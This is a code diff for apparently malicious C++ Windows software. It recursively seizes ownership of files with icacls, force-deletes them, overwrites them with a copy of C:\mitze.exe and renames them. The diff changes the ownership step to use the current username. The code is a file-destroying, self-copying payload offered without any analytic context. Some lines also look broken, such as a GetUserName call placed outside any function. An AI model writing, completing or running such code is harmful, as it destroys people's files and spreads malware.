@@ -5,10 +5,14 @@
 #include <mmsystem.h>
 #include <accctrl.h>
 #include <aclapi.h>
+#include <Lmcons.h>
 #pragma comment( lib, "Winmm.lib" )
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
+char username[UNLEN+1];
+DWORD username_len = UNLEN+1;
+GetUserName(username, &username_len);
 void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
 	if (recursively)
@@ -44,7 +48,7 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
 				const char* Sucker2 = Dutter.c_str();
 				const char* Sucker3 = Butter.c_str();
-				system(("icacls " + string(Chickfila) + " /setowner \"Administrators\" /T /C").c_str());
+				system(("icacls " + string(Chickfila) + " /setowner \""+username+"\" /T /C").c_str());
 				system(("del /f  "+ string(Chickfila)).c_str());
 				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
